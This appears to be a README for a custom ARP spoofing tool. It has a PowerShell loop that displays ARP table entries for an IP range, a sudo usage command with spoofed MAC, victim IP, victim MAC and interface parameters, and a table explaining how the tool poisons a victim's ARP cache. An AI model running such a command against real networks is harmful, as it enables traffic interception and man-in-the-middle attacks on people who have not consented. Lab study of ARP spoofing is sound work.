# ARP Spoofing (but not like the others)

## Display arp table for given IP root powershell

```powershell
$IP_ROOT="200.201.202."

while ($True)
{
    $filter = (arp -a | Select-String -Pattern "^ *$IP_ROOT*" -AllMatches) -join "`n"

    Clear-Host
    Write-Host $filter

    Start-Sleep -Seconds 1
}
```

## Usage

```
sudo ./custom -spoofMAC=DE:AD:BE:EF:11:12 -targetIP=200.201.202.144 -targetMAC=00:15:5D:09:B8:34 -interface=eth1
```

Where

| Parameter | Description                                       |
|-----------|---------------------------------------------------|
| spoofMAC  | New MAC address to be set                         |
| targetIP  | Ip entry in the ARP table of victim to be altered |
| targetMAC | MAC address of the victim to send the attack to   |
| interface | Interface to use to send attack                   |

In the above command, our machine will send packets using `eth1` to the machine with MAC address `00:15:5D:09:B8:34`,
that will receive packets telling it machine with IP `200.201.202.144` has MAC address `DE:AD:BE:EF:11:12`.

